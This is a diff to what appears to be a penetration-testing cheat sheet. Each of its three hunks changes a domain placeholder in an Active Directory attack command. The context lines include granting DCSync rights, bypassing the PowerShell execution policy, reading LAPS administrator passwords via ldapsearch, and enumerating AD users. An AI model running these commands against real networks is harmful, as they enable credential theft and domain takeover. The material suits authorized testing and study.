@@ -3936,7 +3936,7 @@ powershell -ep bypass
 ```c
 $pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
-Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity <USERNAME> -Rights DCSync
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
 ```
 
 ##### DCSync
@@ -5143,7 +5143,7 @@ ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
 ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
 ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
 ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
-ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "dc=<DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
 ```
 
@@ -6119,7 +6119,7 @@ systeminfo
 Get-Process
 net users
 net users <USERNAME>
-Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
+Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=<DOMAIN>"
 Get-Content <FILE>
 Get-ChildItem . -Force
 GCI -hidden
